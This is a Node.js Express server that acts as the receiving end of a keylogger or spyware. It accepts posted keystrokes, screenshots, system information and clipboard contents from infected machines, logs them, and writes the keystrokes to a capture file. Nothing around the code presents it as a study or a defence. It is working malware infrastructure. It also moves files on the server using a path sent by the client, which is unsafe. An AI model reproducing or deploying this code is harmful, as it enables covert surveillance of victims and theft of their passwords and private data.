const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();

// Use body-parser to parse JSON bodies
app.use(bodyParser.json({ extended: true }));

const port = 8080;

// Route to handle POST requests and save the received data
app.post("/", (req, res) => {
    const { keystrokes, screenshot, system_info, clipboard_content } = req.body;

    if (keystrokes) {
        console.log("Keystrokes:", keystrokes);
        // Save or process keystrokes
        fs.appendFileSync("keystroke_captures.txt", keystrokes.join('') + "\n");
    }
    
    if (screenshot) {
        console.log("Screenshot captured:", screenshot);
        // Save or process screenshot
        // For example, you can move it to a specific directory
        fs.renameSync(screenshot, `screenshots/${Date.now()}_screenshot.jpg`);
    }

    if (system_info) {
        console.log("System information:", system_info);
        // Save or process system information
    }

    if (clipboard_content) {
        console.log("Clipboard content:", clipboard_content);
        // Save or process clipboard content
    }

    res.send("Data received successfully");
});

// Start the server and listen on the specified port
app.listen(port, () => {
    console.log(`Server is listening on port ${port}`);
});
